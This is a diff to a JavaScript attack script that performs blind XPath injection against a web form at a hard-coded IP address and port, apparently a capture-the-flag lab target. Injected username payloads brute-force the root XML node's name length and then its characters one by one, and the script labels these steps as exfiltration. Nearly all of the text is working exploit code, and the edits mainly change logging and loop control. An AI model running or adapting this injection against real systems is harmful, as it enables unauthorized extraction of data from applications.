@@ -9,13 +9,14 @@ async function determineRootNodeLength() {
     let rootNodeNameLength = 1;
     let success = true;
     
+    console.log(`🦑Exfiltrating Length Root Node's Name`)
     while (success) {
         try {
             
             // Modify the payload to check the length of the root node's name
             const payload = `username=invalid' or string-length(name(/*[1]))=${rootNodeNameLength} and '1'='1&msg=Hello`;
             let contentLength = payload.length
-            console.log(payload)
+            //console.log(payload)
             // Define the request headers
             const headers = {
                 'Host': '94.237.58.148:31461',
@@ -37,11 +38,11 @@ async function determineRootNodeLength() {
             // Find and extract the value from the script tag
             const match = scriptContent.match(/alert\("(.*)"\);/);
             const result = match ? match[1] : null;
-            console.log("[-]",result)
+            //console.log("[-]",result)
             //Check if the response indicates success
             if (result.includes("Message successfully sent!")) {
                 success = false;
-                console.log("Root node's name length: ",rootNodeNameLength);
+                console.log("Length: ",rootNodeNameLength);
                 determineRootNodeName(rootNodeNameLength)
                 break;
              } 
@@ -56,8 +57,9 @@ async function determineRootNodeLength() {
 }
 
 async function determineRootNodeName(rootNodeNameLength) {
+    console.log(`🦑Exfiltrating Root Node's Name`)
     const alphabet = 'abcdefghijklmnopqrstuvwxyz';
-    const rootNodeNameMask = '*'.repeat(rootNodeNameLength)
+    let loading = ''
     let rootNodeName = ''
 
     for (let j = 1; j < rootNodeNameLength; j++) {
@@ -69,7 +71,7 @@ async function determineRootNodeName(rootNodeNameLength) {
                 // Modify the payload to check the root node's name
                 const payload = `username=invalid' or substring(name(/*[1]),${j},1)='${char}'and '1'='1&msg=Hello`;
                 let contentLength = payload.length
-                console.log(payload)
+                //console.log(payload)
                 // Define the request headers
                 const headers = {
                     'Host': '94.237.58.148:31461',
@@ -91,14 +93,17 @@ async function determineRootNodeName(rootNodeNameLength) {
                 // Find and extract the value from the script tag
                 const match = scriptContent.match(/alert\("(.*)"\);/);
                 const result = match ? match[1] : null;
-                console.log("[-]",result)
+                //console.log("[-]",result)
                 //Check if the response indicates success
                 if (result.includes("Message successfully sent!")  || rootNodeNameLength <= rootNodeName.length) {
+                    //loading += '😼'
                     rootNodeName += char
-                    console.log("[*] ",rootNodeName);
-                    continue;
-                 } else {
-                    console.log("Root node's name: ", rootNodeName);
+                    //console.log(loading);
+                    //continue;
+                 } 
+                 if(rootNodeNameLength == rootNodeName.length+1) {
+                    console.log(`Name: <${rootNodeName}>`);
+                    break;
                  } 
             } catch (error) {
                 console.error('Error:', error.message);
